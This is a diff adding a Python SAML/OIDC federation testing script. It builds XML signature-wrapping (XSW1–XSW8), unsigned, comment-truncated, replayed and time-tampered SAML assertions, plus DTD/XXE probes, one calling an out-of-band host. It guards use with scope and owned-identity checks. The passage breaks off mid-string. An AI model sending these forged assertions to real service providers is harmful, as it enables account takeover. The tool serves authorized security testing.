@@ -1,0 +1,2756 @@
+#!/usr/bin/env python3
+"""Mythos federation — SAML, OIDC/OAuth federation and account linking.
+
+`authflows` owns the flows an application runs by itself: reset, MFA, session,
+email change, passkeys. This file owns the flows an application runs *with
+somebody else*: a SAML service provider trusting an identity provider, an
+OAuth/OIDC client trusting an authorization server, and the account-linking
+step where those two identities are joined to a local account. The split is
+deliberate — `authflows` is already 1500 lines, and nothing here shares its
+mutation sets. What they do share is the shape: build the mutation offline,
+send a handful of requests, judge each against an oracle, and keep the
+unmodified flow as the control.
+
+  scripts/federation saml <acs-url> ...     signature stripping, XSW1-XSW8,
+                                            NameID comment truncation, Audience /
+                                            Recipient / Destination / time
+                                            enforcement, replay, IdP-initiated
+                                            and RelayState, DTD and XXE probes
+  scripts/federation shapes ...             the same documents, printed and not
+                                            sent: what each XSW shape builds
+  scripts/federation metadata <url> ...     SP/IdP metadata and certificate
+                                            rotation handling, read only
+  scripts/federation oidc <authorize-url> ... redirect_uri matching, state,
+                                            PKCE downgrade, response_type and
+                                            response_mode downgrade, prompt=none
+  scripts/federation token <token-url> ...  code reuse, code injection, PKCE
+                                            verifier enforcement, redirect_uri
+                                            and client rebinding at redemption
+  scripts/federation idtoken <rp-url> ...   alg:none, HS/RS confusion, audience
+                                            confusion, nonce replay, token
+                                            substitution, kid / jku / x5u
+  scripts/federation linking <link-url> ... unverified email from an IdP,
+                                            two IdPs on one email, a
+                                            pre-registered account claimed, a
+                                            stale session after unlinking
+  scripts/federation selftest               live asserts against a loopback
+                                            SP/RP this command starts itself
+
+EVERY IDENTITY THIS SCRIPT ASSERTS MUST BE ONE THE OPERATOR OWNS.
+`--own` is required on every subcommand that mints or replays an identity, and
+every subject, NameID, email and `sub` is checked against that list before a
+byte is sent. A minted assertion for somebody else's name is not a test: it is
+an attempt to log in as that person, and it is refused here in code, in every
+mode, with the identity it refused named. The same holds for a captured
+`SAMLResponse`: its NameID is parsed and checked before it is replayed.
+
+An identity provider is a third party, and a request to it is ours. Its host
+must be in `scope.yaml` like the target's, and an out-of-scope destination is
+refused rather than warned about, naming what was refused.
+
+No brute force. Nothing here walks a code, state or `user_code` space. Where
+the only proof would be guessing, the finding is the missing rate limit, shown
+with at most 10 attempts and the ceiling stated in the output.
+
+Verdicts are `candidate`, `held` or `inconclusive`, never `confirmed`: the
+validate phase replays the recorded bytes and decides that. A refusal is only
+reported as enforcement when the unmodified control flow succeeded in the same
+run; otherwise every row is `inconclusive`, because a malformed request being
+rejected says nothing about the check it was aimed at.
+
+Signing: stdlib only, so the test key is HMAC-SHA256
+(`http://www.w3.org/2001/04/xmldsig-more#hmac-sha256` for XML-DSig, `HS256`
+for a JWT). Both are real algorithms and a correctly signed document comes out,
+but a production IdP signs with RSA-SHA256 and no stdlib module does RSA. So
+`--mint` produces a document whose signature a real SP will reject, and that is
+still the check that matters: it answers "does this SP verify a signature at
+all". Rows whose proof genuinely needs an RSA signature are marked
+`rsa_not_covered` and say what a real IdP, SAML Raider or a `cryptography`
+install would have to do instead. Nothing here pretends to have signed with a
+key it does not have.
+"""
+import argparse
+import base64
+import hashlib
+import hmac
+import importlib.machinery
+import importlib.util
+import json
+import os
+import pathlib
+import re
+import secrets
+import ssl
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+import xml.etree.ElementTree as ET
+import zlib
+
+UA = "mythos-federation/1.0 (authorized security testing)"
+ROOT = pathlib.Path(__file__).resolve().parent.parent
+
+# ---------------------------------------------------------------- plumbing
+
+_mods = {}
+
+
+def mod(name):
+    """Load a sibling hook by path so its logic is called, not copied."""
+    if name not in _mods:
+        rel = {"scope-guard": "hooks/scope-guard.py"}[name]
+        loader = importlib.machinery.SourceFileLoader(
+            f"mythos_{name}".replace("-", "_"), str(ROOT / rel))
+        spec = importlib.util.spec_from_loader(loader.name, loader)
+        m = importlib.util.module_from_spec(spec)
+        loader.exec_module(m)
+        _mods[name] = m
+    return _mods[name]
+
+
+def require_in_scope(*urls_or_hosts):
+    """Refuse out-of-scope destinations instead of warning after the fact.
+
+    The guard around the agent's tool calls only warns, and by then the request
+    has left. An identity provider is a third party: the authorization request
+    we send to it, the JWKS URL we point a relying party at and the ACS we post
+    an assertion to are all ours, so all three are checked with the same
+    authority as the target.
+    """
+    sg = mod("scope-guard")
+    bad = []
+    for item in urls_or_hosts:
+        if not item:
+            continue
+        probe = item if "//" in str(item) else f"https://{item}/"
+        bad += sg.check(probe)["offenders"]
+    if bad:
+        raise SystemExit(
+            "federation: refusing, out of scope: " + ", ".join(sorted(set(bad)))
+            + "\n  An IdP or JWKS host is a third party, and a request to it is "
+              "ours. Add it to scope.yaml in an editor, outside the run, or do "
+              "not test that leg.")
+
+
+def scope_rate(default=5.0):
+    """rules.rate_limit_rps from the engagement scope, not a guess."""
+    path = os.environ.get("MYTHOS_SCOPE")
+    if not path:
+        return default
+    try:
+        text = pathlib.Path(path).read_text(encoding="utf-8", errors="replace")
+    except OSError:
+        return default
+    try:
+        import yaml  # type: ignore
+        data = yaml.safe_load(text) or {}
+        rules = data.get("rules") or {}
+        if isinstance(rules, dict) and rules.get("rate_limit_rps") is not None:
+            return float(rules["rate_limit_rps"])
+    except Exception:
+        pass
+    m = re.search(r"^\s*rate_limit_rps\s*:\s*([0-9.]+)", text, re.M)
+    try:
+        return float(m.group(1)) if m else default
+    except (TypeError, ValueError):
+        return default
+
+
+_LAST = [0.0]
+_GAP = [0.0]
+_SENT = [0]
+
+
+def pace():
+    gap = _GAP[0]
+    if gap <= 0:
+        return
+    wait = _LAST[0] + gap - time.monotonic()
+    if wait > 0:
+        time.sleep(wait)
+    _LAST[0] = time.monotonic()
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    """A redirect is the evidence here, so never follow one silently."""
+
+    def redirect_request(self, req, fp, code, msg, headers, newurl):
+        return None
+
+
+def send(method, url, headers=None, body=None, timeout=10, insecure=False,
+         follow=False):
+    """One request, paced and scope-checked, with the full response back."""
+    require_in_scope(url)
+    pace()
+    _SENT[0] += 1
+    data = body.encode() if isinstance(body, str) else body
+    req = urllib.request.Request(url, data=data, method=method,
+                                 headers={"User-Agent": UA, **(headers or {})})
+    # The TLS context rides on a handler, not on `OpenerDirector.open`, which
+    # takes no `context=` keyword. `scripts/authflows` shipped that mistake and
+    # every request came back `status: None` with the exception as the body, so
+    # the loopback round trip in `selftest` below is not decoration.
+    ctx = ssl._create_unverified_context() if insecure else None
+    handlers = [] if follow else [NoRedirect]
+    if ctx is not None:
+        handlers.append(urllib.request.HTTPSHandler(context=ctx))
+    opener = urllib.request.build_opener(*handlers)
+    try:
+        with opener.open(req, timeout=timeout) as r:
+            raw = r.read(300_000)
+            return {"status": r.status, "headers": _hdrs(r.headers),
+                    "set_cookie": r.headers.get_all("Set-Cookie") or [],
+                    "body": raw.decode("utf-8", "replace"), "url": r.geturl()}
+    except urllib.error.HTTPError as e:
+        raw = e.read(300_000) if e.fp else b""
+        return {"status": e.code, "headers": _hdrs(e.headers or {}),
+                "set_cookie": (e.headers.get_all("Set-Cookie") if e.headers else None) or [],
+                "body": raw.decode("utf-8", "replace"), "url": url}
+    except Exception as e:                        # DNS, TLS, refused, timeout
+        return {"status": None, "headers": {}, "set_cookie": [],
+                "body": f"{type(e).__name__}: {e}", "url": url}
+
+
+def _hdrs(h):
+    try:
+        return {k.lower(): v for k, v in h.items()}
+    except Exception:
+        return {}
+
+
+def form(pairs):
+    return urllib.parse.urlencode(pairs)
+
+
+FORM_CT = {"Content-Type": "application/x-www-form-urlencoded"}
+
+# ------------------------------------------------------------- ownership
+
+# Everything that follows asserts an identity to somebody. The one check that
+# cannot be left to a prompt is whether that identity belongs to the operator,
+# so it is a function every command calls before its first request, and the
+# refusal names the identity it would not assert.
+
+
+def own_guard(owned, **identities):
+    """Refuse to assert an identity that is not on the operator's own list.
+
+    `owned` is `--own`, repeatable. Each keyword is a role (`subject`,
+    `victim`, `email`, `sub`, `nameid`) mapped to the value the command would
+    put in a document. Matching is case-insensitive and exact: a prefix match
+    would let `admin@x.com` through for an owned `admin@x.com.evil.test`, which
+    is the direction of the bug class this file tests.
+    """
+    pool = {str(o).strip().lower() for o in (owned or []) if str(o).strip()}
+    if not pool:
+        raise SystemExit(
+            "federation: refusing, --own is required. Name every account you "
+            "own that this run may assert (repeat the flag). A federation test "
+            "against an identity you do not own is an attack on that person.")
+    bad = []
+    for role, value in identities.items():
+        if value is None or value == "":
+            continue
+        base = str(value).strip().lower()
+        # The comment and suffix mutations below deliberately append to an
+        # owned identity. What has to be owned is the identity the document
+        # claims, so the mutation's own suffix is stripped before the check and
+        # the base is what must be on the list.
+        base = COMMENT_SPLIT.sub("", base)
+        if base not in pool:
+            bad.append(f"{role}={value!r}")
+    if bad:
+        raise SystemExit(
+            "federation: refusing to assert an identity that is not yours: "
+            + ", ".join(bad)
+            + "\n  on the --own list: " + (", ".join(sorted(pool)) or "(nothing)")
+            + "\n  This is refused in every mode and no scope rule permits it.")
+
+
+def own_guard_any(owned, label, **candidates):
+    """At least one identifier of a captured credential must be owned.
+
+    A minted identity is checked exactly (`own_guard`): we choose what it says,
+    so there is no excuse for it naming somebody else. A *captured* credential
+    is different — a real `sub` is an opaque string and a transient `NameID` is
+    random, so demanding every claim be on the list would mean refusing the
+    operator's own token. The enforceable rule is that something in it must be
+    an identity the operator declared: the email, the username, or the subject
+    identifier they can read off their own login. Nothing matching means the
+    credential is not demonstrably theirs, and it is refused.
+    """
+    pool = {str(o).strip().lower() for o in (owned or []) if str(o).strip()}
+    if not pool:
+        raise SystemExit("federation: refusing, --own is required.")
+    seen = {k: v for k, v in candidates.items() if v}
+    if not seen:
+        raise SystemExit(
+            f"federation: refusing, the {label} carries no identifier to check "
+            f"against --own (looked at: {', '.join(candidates)}).")
+    if not any(str(v).strip().lower() in pool for v in seen.values()):
+        raise SystemExit(
+            f"federation: refusing to replay a {label} that is not "
+            f"demonstrably yours: " + ", ".join(f"{k}={v!r}" for k, v in seen.items())
+            + "\n  on the --own list: " + ", ".join(sorted(pool))
+            + "\n  Add the identifier from your own login to --own, or capture "
+              "a credential for an account you own.")
+
+
+COMMENT_SPLIT = re.compile(r"<!--.*?-->.*$", re.S)
+
+# ------------------------------------------------------------ SAML: XML
+#
+# String surgery, not a DOM round trip, and on purpose. Re-serializing a signed
+# element through `xml.etree` rewrites namespace prefixes and attribute order,
+# which changes the exact bytes the signature was computed over; every wrapping
+# shape below depends on the signed element surviving byte for byte. So the
+# signed element is located by span and spliced, and `xml.etree` is used only to
+# parse the result back for the shape assertions.
+
+SAML_P = "urn:oasis:names:tc:SAML:2.0:protocol"
+SAML_A = "urn:oasis:names:tc:SAML:2.0:assertion"
+DS = "http://www.w3.org/2000/09/xmldsig#"
+NS = {"samlp": SAML_P, "saml": SAML_A, "ds": DS}
+HMAC_SHA256 = "http://www.w3.org/2001/04/xmldsig-more#hmac-sha256"
+
+
+def el_span(xml, local, which=0):
+    """(start, end) of the n-th `<?:Local …>…</?:Local>` in `xml`, byte-exact."""
+    tag = rf"(?:[A-Za-z0-9_.-]+:)?{local}"
+    opens = [m.start() for m in re.finditer(rf"<{tag}(?=[\s/>])", xml)]
+    if which >= len(opens):
+        return None
+    start = opens[which]
+    depth = 0
+    for m in re.finditer(rf"<{tag}(?=[\s/>])|</{tag}\s*>", xml[start:]):
+        if m.group(0).startswith("</"):
+            depth -= 1
+            if depth == 0:
+                return (start, start + m.end())
+        else:
+            gt = xml.index(">", start + m.start())
+            if xml[gt - 1] == "/":                       # self-closing
+                if depth == 0:
+                    return (start, gt + 1)
+                continue
+            depth += 1
+    return None
+
+
+def el(xml, local, which=0):
+    span = el_span(xml, local, which)
+    return xml[span[0]:span[1]] if span else None
+
+
+def count_el(xml, local):
+    tag = rf"(?:[A-Za-z0-9_.-]+:)?{local}"
+    return len(re.findall(rf"<{tag}(?=[\s/>])", xml))
+
+
+def drop_el(xml, local, which=0):
+    span = el_span(xml, local, which)
+    return xml if not span else xml[:span[0]] + xml[span[1]:]
+
+
+def drop_all(xml, local):
+    while el_span(xml, local) is not None:
+        xml = drop_el(xml, local)
+    return xml
+
+
+def set_attr(element, name, value):
+    """Set or add an attribute on an element's own opening tag."""
+    gt = element.index(">")
+    head, rest = element[:gt], element[gt:]
+    pat = re.compile(rf'(\s{re.escape(name)}=")[^"]*(")')
+    if pat.search(head):
+        return pat.sub(lambda m: m.group(1) + value + m.group(2), head, count=1) + rest
+    close = "/" if head.endswith("/") else ""
+    head = head[:-1] if close else head
+    return f'{head} {name}="{value}"{close}' + rest
+
+
+def get_attr(element, name):
+    m = re.search(rf'\s{re.escape(name)}="([^"]*)"', element[:element.index(">") + 1])
+    return m.group(1) if m else None
+
+
+def set_nameid(xml, value):
+    """Replace the text of the first NameID, keeping its attributes."""
+    span = el_span(xml, "NameID")
+    if not span:
+        return xml
+    element = xml[span[0]:span[1]]
+    gt = element.index(">")
+    end = element.rindex("<")
+    return xml[:span[0]] + element[:gt + 1] + value + element[end:] + xml[span[1]:]
+
+
+def nameid_text(xml):
+    element = el(xml, "NameID")
+    if not element:
+        return None
+    return element[element.index(">") + 1:element.rindex("<")]
+
+
+def saml_attr(xml, name):
+    """The value of one SAML attribute, for the ownership check on a capture."""
+    m = re.search(rf'Name="{re.escape(name)}"[^>]*>\s*<[^>]*AttributeValue[^>]*>'
+                  r'([^<]*)<', xml or "")
+    return m.group(1).strip() if m else None
+
+
+def c14n(fragment):
+    """Canonical form of one element, for the digest.
+
+    `ET.canonicalize` is C14N 2.0, not the Exclusive XML Canonicalization 1.0
+    that SAML actually names. For our own key that is consistent (we sign and
+    we would verify the same way); against a real SP it is one more reason a
+    minted signature does not verify there, on top of HMAC vs RSA.
+    """
+    return ET.canonicalize(xml_data=fragment, strip_text=False).encode()
+
+
+def sign_hmac(xml, key, ref_local="Assertion"):
+    """Enveloped HMAC-SHA256 XML-DSig over one element, inserted into it.
+
+    Correct per XML-DSig for a shared key, and useless against a production SP,
+    which trusts an RSA certificate. The point of a minted signature is to find
+    out whether the SP verifies one at all.
+    """
+    span = el_span(xml, ref_local)
+    if not span:
+        return xml, None
+    element = xml[span[0]:span[1]]
+    ref_id = get_attr(element, "ID") or ("_" + secrets.token_hex(8))
+    element = set_attr(element, "ID", ref_id)
+    bare = drop_all(element, "Signature")
+    digest = base64.b64encode(hashlib.sha256(c14n(bare)).digest()).decode()
+    signed_info = (
+        f'<ds:SignedInfo xmlns:ds="{DS}">'
+        '<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
+        f'<ds:SignatureMethod Algorithm="{HMAC_SHA256}"/>'
+        f'<ds:Reference URI="#{ref_id}">'
+        '<ds:Transforms>'
+        '<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>'
+        '<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
+        '</ds:Transforms>'
+        '<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
+        f'<ds:DigestValue>{digest}</ds:DigestValue>'
+        '</ds:Reference></ds:SignedInfo>')
+    mac = base64.b64encode(
+        hmac.new(key, c14n(signed_info), hashlib.sha256).digest()).decode()
+    sig = (f'<ds:Signature xmlns:ds="{DS}">{signed_info}'
+           f'<ds:SignatureValue>{mac}</ds:SignatureValue>'
+           '<ds:KeyInfo><ds:KeyName>mythos-federation-test-key</ds:KeyName>'
+           '</ds:KeyInfo></ds:Signature>')
+    issuer = el_span(element, "Issuer")
+    at = issuer[1] if issuer else element.index(">") + 1
+    element = element[:at] + sig + element[at:]
+    return xml[:span[0]] + element + xml[span[1]:], ref_id
+
+
+def mint_response(*, nameid, acs, issuer="http://idp.mythos.lab/metadata",
+                  audience=None, destination=None, in_response_to=None,
+                  not_before=None, not_on_or_after=None, email=None,
+                  key=None, sign="assertion"):
+    """A complete SAML 2.0 Response, ours, signed with our own test key."""
+    now = time.gmtime()
+    stamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", now)
+    nb = not_before or time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 60))
+    noa = not_on_or_after or time.strftime("%Y-%m-%dT%H:%M:%SZ",
+                                           time.gmtime(time.time() + 300))
+    rid, aid = "_r" + secrets.token_hex(8), "_a" + secrets.token_hex(8)
+    irt = f' InResponseTo="{in_response_to}"' if in_response_to else ""
+    attrs = ""
+    if email:
+        attrs = ('<saml:AttributeStatement>'
+                 '<saml:Attribute Name="email">'
+                 f'<saml:AttributeValue>{email}</saml:AttributeValue>'
+                 '</saml:Attribute></saml:AttributeStatement>')
+    xml = (
+        f'<samlp:Response xmlns:samlp="{SAML_P}" xmlns:saml="{SAML_A}" '
+        f'ID="{rid}" Version="2.0" IssueInstant="{stamp}" '
+        f'Destination="{destination or acs}"{irt}>'
+        f'<saml:Issuer>{issuer}</saml:Issuer>'
+        '<samlp:Status><samlp:StatusCode '
+        'Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
+        f'<saml:Assertion xmlns:saml="{SAML_A}" ID="{aid}" Version="2.0" '
+        f'IssueInstant="{stamp}">'
+        f'<saml:Issuer>{issuer}</saml:Issuer>'
+        '<saml:Subject>'
+        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:'
+        f'emailAddress">{nameid}</saml:NameID>'
+        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
+        f'<saml:SubjectConfirmationData NotOnOrAfter="{noa}" Recipient="{acs}"'
+        f'{irt}/></saml:SubjectConfirmation></saml:Subject>'
+        f'<saml:Conditions NotBefore="{nb}" NotOnOrAfter="{noa}">'
+        '<saml:AudienceRestriction>'
+        f'<saml:Audience>{audience or acs}</saml:Audience>'
+        '</saml:AudienceRestriction></saml:Conditions>'
+        f'<saml:AuthnStatement AuthnInstant="{stamp}" '
+        f'SessionIndex="{aid}"><saml:AuthnContext>'
+        '<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:'
+        'PasswordProtectedTransport</saml:AuthnContextClassRef>'
+        '</saml:AuthnContext></saml:AuthnStatement>'
+        f'{attrs}</saml:Assertion></samlp:Response>')
+    if key and sign in ("assertion", "both"):
+        xml, _ = sign_hmac(xml, key, "Assertion")
+    if key and sign in ("response", "both"):
+        xml, _ = sign_hmac(xml, key, "Response")
+    return xml
+
+
+def load_response(text):
+    """A captured SAMLResponse: raw XML, base64, or base64 of deflate."""
+    text = text.strip()
+    if text.startswith("<"):
+        return text
+    raw = base64.b64decode(text + "=" * (-len(text) % 4))
+    if raw[:1] != b"<":
+        try:
+            raw = zlib.decompress(raw, -15)
+        except zlib.error:
+            pass
+    return raw.decode("utf-8", "replace")
+
+# ------------------------------------------------- SAML: wrapping shapes
+#
+# Eight shapes, after Somorovsky et al. (USENIX 2012) and the set SAML Raider
+# ships under the same names. Each one keeps the IdP's signed element exactly
+# as it arrived and adds an unsigned copy carrying the attacker's NameID
+# somewhere a different XPath finds first. Which shape wins depends on which
+# element the SP's "read the assertion" code selects versus the one its "verify
+# the signature" code selected — that is the whole bug class, so all eight are
+# built and all eight are sent.
+#
+# Each builder returns (document, what_it_built) or (None, why_not). `why_not`
+# is a row in the output, never a silent skip: a shape that cannot be built
+# because the capture has no signature on that element is information.
+
+
+def _evil_copy(signed, victim, new_id):
+    """An unsigned copy of a signed element, with fresh IDs and the new NameID.
+
+    Every ID in the copy has to change, not only the outer one. A Response-level
+    copy carries an Assertion inside it, and leaving that Assertion's ID equal
+    to the original's gives the document two elements with the same ID — which
+    some parsers reject outright and others resolve to the first one, so the
+    shape would be testing the duplicate-ID path instead of the wrapping path.
+    """
+    evil = drop_all(signed, "Signature")
+    evil = set_attr(evil, "ID", new_id)
+    inner = el_span(evil, "Assertion")
+    if inner and not evil.startswith(("<saml:Assertion", "<Assertion")) \
+            and "Assertion" not in evil[:evil.index(">")]:
+        evil = evil[:inner[0]] \
+            + set_attr(evil[inner[0]:inner[1]], "ID", new_id + "a") \
+            + evil[inner[1]:]
+    return set_nameid(evil, victim)
+
+
+def _wrap(xml, local, victim, place):
+    """Shared body of every shape: locate the signed element, then splice.
+
+    `place(signed, evil, sig_span_in_evil)` returns the replacement text.
+    """
+    span = el_span(xml, local)
+    if not span:
+        return None, f"the capture has no <{local}> element"
+    signed = xml[span[0]:span[1]]
+    if el_span(signed, "Signature") is None:
+        return None, f"the <{local}> in this capture is not signed, so there is nothing to wrap"
+    evil = _evil_copy(signed, victim, "_evil" + secrets.token_hex(6))
+    return xml[:span[0]] + place(signed, evil) + xml[span[1]:], None
+
+
+def _into_signature(signed, evil, payload):
+    """Put `payload` inside the evil copy's own Signature element."""
+    # The evil copy has its signature removed, so one is grafted back: a copy
+    # of the original's, which is what makes the shape interesting (the SP sees
+    # a signature on the element it is reading).
+    sig = el(signed, "Signature")
+    close = "</ds:Signature>" if "</ds:Signature>" in sig else "</Signature>"
+    at = sig.rindex(close)
+    hosted = sig[:at] + payload + sig[at:]
+    issuer = el_span(evil, "Issuer")
+    pos = issuer[1] if issuer else evil.index(">") + 1
+    return evil[:pos] + hosted + evil[pos:]
+
+
+def xsw1(xml, victim):
+    """Response signature: the signed Response goes inside the evil copy's Signature."""
+    return _wrap(xml, "Response", victim,
+                 lambda s, e: _into_signature(s, e, s))
+
+
+def xsw2(xml, victim):
+    """Response signature: the signed Response follows the evil copy's Signature."""
+    def place(s, e):
+        sig = el(s, "Signature")
+        issuer = el_span(e, "Issuer")
+        pos = issuer[1] if issuer else e.index(">") + 1
+        return e[:pos] + sig + s + e[pos:]
+    return _wrap(xml, "Response", victim, place)
+
+
+def xsw3(xml, victim):
+    """Assertion signature: the evil Assertion precedes the signed one as a sibling."""
+    return _wrap(xml, "Assertion", victim, lambda s, e: e + s)
+
+
+def xsw4(xml, victim):
+    """Assertion signature: the signed Assertion becomes the evil one's first child."""
+    def place(s, e):
+        pos = e.index(">") + 1
+        return e[:pos] + s + e[pos:]
+    return _wrap(xml, "Assertion", victim, place)
+
+
+def xsw5(xml, victim):
+    """Assertion signature: the evil Assertion carries the signature, the signed one follows."""
+    def place(s, e):
+        sig = el(s, "Signature")
+        issuer = el_span(e, "Issuer")
+        pos = issuer[1] if issuer else e.index(">") + 1
+        return e[:pos] + sig + e[pos:] + s
+    return _wrap(xml, "Assertion", victim, place)
+
+
+def xsw6(xml, victim):
+    """Assertion signature: the signed Assertion goes inside the evil one's Signature."""
+    return _wrap(xml, "Assertion", victim, lambda s, e: _into_signature(s, e, s))
+
+
+def xsw7(xml, victim):
+    """Assertion signature: the signed Assertion hides in an Extensions element before the evil one."""
+    def place(s, e):
+        return f'<samlp:Extensions xmlns:samlp="{SAML_P}">{s}</samlp:Extensions>' + e
+    return _wrap(xml, "Assertion", victim, place)
+
+
+def xsw8(xml, victim):
+    """Assertion signature: the signed Assertion goes inside ds:Object inside the evil Signature."""
+    return _wrap(xml, "Assertion", victim,
+                 lambda s, e: _into_signature(
+                     s, e, f'<ds:Object xmlns:ds="{DS}">{s}</ds:Object>'))
+
+
+XSW = {"xsw1": xsw1, "xsw2": xsw2, "xsw3": xsw3, "xsw4": xsw4,
+       "xsw5": xsw5, "xsw6": xsw6, "xsw7": xsw7, "xsw8": xsw8}
+
+# ------------------------------------------------------ SAML: mutations
+
+# Read-only XXE and DTD probes. Nothing here expands recursively: a billion
+# laughs is denial of service and is not built, and no local file is read
+# unless the operator names one, because "the parser resolved an entity" is
+# already the finding and the OAST hit proves it without touching a file.
+DOCTYPE_ECHO = ('<!DOCTYPE samlp:Response [ <!ENTITY mythosent '
+                '"MYTHOS-ENTITY-RESOLVED"> ]>')
+
+
+def saml_mutations(base, victim, *, acs, oast=None, audience=None,
+                   destination=None, in_response_to=None, xxe_file=None):
+    """Label -> (document, manipulation, oracle, why_not). Offline, asserted."""
+    rows = []
+
+    base_subject = nameid_text(base)
+
+    def add(label, doc, manipulation, oracle, why_not=None, want=None):
+        # `want` is the identity the oracle should read back if this row is a
+        # finding, and it is not always the victim. Half of these mutations
+        # (the time bounds, InResponseTo, the DOCTYPE) keep the original
+        # subject on purpose, so grading them against the victim scored every
+        # one of them as a non-event; grading the wrapping shapes against
+        # whatever the document's first NameID happens to be scored a shape
+        # that did NOT win as a candidate. Each row therefore says what its own
+        # proof looks like.
+        rows.append({"label": label, "doc": doc, "manipulation": manipulation,
+                     "oracle": oracle, "why_not": why_not,
+                     "want": want if want is not None else victim})
+
+    # --- signature presence
+    unsigned = set_nameid(drop_all(base, "Signature"), victim)
+    add("unsigned", unsigned,
+        "every ds:Signature removed, NameID set to the second owned identity",
+        "the SP issues a session for the NameID we wrote: it never required a signature")
+    if count_el(base, "Signature") >= 2:
+        add("strip-assertion-sig", set_nameid(drop_el(base, "Signature", 1), victim),
+            "the second ds:Signature removed, the first left in place",
+            "accepted = the SP verifies whichever signature it finds and reads an unsigned element")
+    else:
+        add("strip-assertion-sig", None, "remove one of two signatures",
+            "n/a", "the capture carries fewer than two signatures")
+    add("selfsigned", None,
+        "re-sign with our own key while leaving the IdP's KeyInfo in place",
+        "accepted = the SP trusts the key named in the message instead of its configured one",
+        "needs an RSA key to be a true like-for-like of a production IdP; "
+        "rsa_not_covered, use SAML Raider or a cryptography install. The "
+        "`mint` path below is the stdlib half of the same question.")
+
+    # --- comment truncation (Duo, 2018)
+    base_name = nameid_text(base) or victim
+    truncated = f"{victim}<!---->.evil.invalid"
+    add("comment-nameid", set_nameid(base, truncated),
+        f"NameID text set to {truncated!r}: canonicalization (and so the "
+        "signature) covers the whole string, a parser that keeps comments in "
+        "the tree returns only the text before the first one",
+        f"the session belongs to {victim!r} and not to the full string: the SP "
+        "read the first text node")
+    add("comment-nameid-suffix", set_nameid(base, f"{base_name}<!---->.evil.invalid"),
+        "the same shape on the identity the capture already carries",
+        "the SP reports the truncated subject while the document says otherwise",
+        want=base_name)
+
+    # --- the four bindings and the two time bounds
+    for label, attr, value, where, what in (
+        ("audience", "Audience", "urn:mythos:not-this-sp", "Audience",
+         "the assertion names another service provider"),
+        ("recipient", "Recipient", "https://not-this-sp.invalid/acs",
+         "SubjectConfirmationData", "the bearer confirmation names another ACS"),
+        ("destination", "Destination", "https://not-this-sp.invalid/acs",
+         "Response", "the Response is addressed elsewhere"),
+    ):
+        doc = set_nameid(base, victim)
+        if label == "audience":
+            span = el_span(doc, "Audience")
+            if span:
+                element = doc[span[0]:span[1]]
+                doc = doc[:span[0]] + element[:element.index(">") + 1] + value \
+                    + element[element.rindex("<"):] + doc[span[1]:]
+            else:
+                doc = None
+        else:
+            span = el_span(doc, where)
+            if span:
+                doc = doc[:span[0]] + set_attr(doc[span[0]:span[1]], attr, value) \
+                    + doc[span[1]:]
+            else:
+                doc = None
+        add(label, doc, f"{attr} = {value!r} ({what})",
+            f"accepted = the SP does not check {attr}; an assertion minted for "
+            "another SP of the same IdP logs in here",
+            None if doc else f"the capture has no <{where}> to change")
+
+    past = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 7200))
+    doc = set_nameid(base, victim)
+    for where in ("Conditions", "SubjectConfirmationData"):
+        span = el_span(doc, where)
+        if span:
+            doc = doc[:span[0]] + set_attr(doc[span[0]:span[1]], "NotOnOrAfter", past) \
+                + doc[span[1]:]
+    add("expired", doc, f"NotOnOrAfter moved to {past} (two hours ago)",
+        "accepted = the SP does not enforce the assertion's own time bound")
+    future = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + 7200))
+    span = el_span(base, "Conditions")
+    add("notbefore-future",
+        (base[:span[0]] + set_attr(base[span[0]:span[1]], "NotBefore", future)
+         + base[span[1]:]) if span else None,
+        f"NotBefore moved to {future} (two hours away)",
+        "accepted = NotBefore is not enforced either",
+        None if span else "the capture has no <Conditions>", want=base_subject)
+
+    # --- replay, IdP-initiated, RelayState
+    add("replay", base, "the capture sent again, unchanged",
+        "a second acceptance of the same assertion ID means the SP keeps no "
+        "replay cache; the first send is the control, so this row is only "
+        "readable when the control succeeded", want=base_subject)
+    doc = base
+    for where in ("Response", "SubjectConfirmationData"):
+        span = el_span(doc, where)
+        if span:
+            element = doc[span[0]:span[1]]
+            element = re.sub(r'\sInResponseTo="[^"]*"', "", element, count=1)
+            doc = doc[:span[0]] + element + doc[span[1]:]
+    add("idp-initiated", doc, "InResponseTo removed from Response and SubjectConfirmationData",
+        "accepted = the SP takes an unsolicited response, so nothing ties the "
+        "assertion to a request this browser made (login CSRF)",
+        want=base_subject)
+
+    # --- XSW
+    for name, fn in XSW.items():
+        doc, why = fn(base, victim)
+        add(name, doc, fn.__doc__.strip().splitlines()[0],
+            f"the session belongs to {victim!r} while the signature still "
+            "verifies over the original element: the SP reads an element the "
+            "signature does not cover", why)
+
+    # --- DTD and XXE, read only
+    add("doctype", DOCTYPE_ECHO + base.replace("&", "&amp;"),
+        "an internal DTD declared in front of the Response",
+        "a parse that succeeds at all means DOCTYPE is not rejected, which is "
+        "the precondition for every parser-differential bypass (ruby-saml "
+        "CVE-2025-25291/-25292)", want=base_subject)
+    add("xxe-internal",
+        DOCTYPE_ECHO + set_nameid(drop_all(base, "Signature"), "&mythosent;"),
+        "NameID replaced with an internal entity reference",
+        "MYTHOS-ENTITY-RESOLVED read back as the subject = the parser expands "
+        "entities in the assertion", want="MYTHOS-ENTITY-RESOLVED")
+    if oast:
+        add("xxe-oast",
+            f'<!DOCTYPE samlp:Response [ <!ENTITY % mythosext SYSTEM '
+            f'"http://{oast}/saml-xxe"> %mythosext; ]>'
+            + drop_all(base, "Signature"),
+            f"an external parameter entity pointing at {oast}",
+            "a request arriving at the OAST host = the parser fetches external "
